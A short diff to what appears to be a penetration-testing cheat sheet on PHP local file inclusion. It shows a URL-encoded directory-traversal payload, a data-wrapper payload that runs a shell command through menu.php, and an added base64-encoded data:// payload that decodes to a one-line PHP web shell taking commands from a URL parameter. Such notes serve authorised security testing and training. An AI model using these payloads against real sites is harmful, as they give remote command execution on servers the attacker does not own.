@@ -22,6 +22,7 @@ http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%
 
 # Data filter
 /menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id    # <?php system($_GET["cmd"]); ?>
 
 # If site return error code on fail, use ffuf or burp intruder
 
